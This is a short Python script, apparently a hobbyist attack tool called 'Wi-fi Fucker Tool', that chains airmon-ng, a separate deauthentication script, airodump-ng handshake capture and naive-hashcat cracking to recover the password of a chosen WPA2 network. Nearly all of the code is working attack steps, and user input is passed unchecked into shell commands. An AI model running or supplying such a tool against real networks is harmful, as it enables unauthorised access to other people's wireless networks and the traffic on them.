import os , time , pyautogui
import webbrowser
print("""

    ███████████████████████████████
    █                             █
    █═╬═════════════════════════╬═█
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░Wi-fi Fucker Tool░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░coded by arda6░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █═╬═════════════════════════╬═█
    █                             █
    ███████████████████████████████


""")
os.system("sudo airmon-ng start")
print("░░░░░░░░░░░░░░░░░░░░ ═")
wifi = input("░░Select Wifi Card░░ ═ \n░░░░░░░░░░░░░░░░░░░░ ═ ")
os.system("sudo airmon-ng start " +wifi+"mon")
time.sleep(1)
os.system("start python3 deauth.py")
pyautogui.press("ctrl+c")
print("░░░░░░░░░░░░░░░░░░ ═")
channel = input("░░Select Channel░░ ═ \n░░░░░░░░░░░░░░░░░░ ═ ")
print("")
print("░░░░░░░░░░░░░░░░ ═ ")
bssid = input("░░Select BSSID░░ ═ \n░░░░░░░░░░░░░░░░ ═ ")
os.system("sudo airodump-ng -c "+channel+" --bssid "+bssid+ " -w /root/Desktop/eyllwpa2.cap " +wifi+"mon")
print(".cap to .hccapx => https://hashcat.net/cap2hccapx/ ")
webbrowser.open("https://hashcat.net/cap2hccapx/")
os.system("git clone https://github.com/brannondorsey/naive-hashcat.git")
print("░░░░░░░░░░░░░░░░ ═")
down = input("░░.hccapx Path░░ ═ \n░░░░░░░░░░░░░░░░ ═ ")
os.system("HASH_FILE="+down+" POT_FILE=cracked-wpa2-by-eyll.pot HASH_TYPE=2500 ./naive-hashcat.sh")
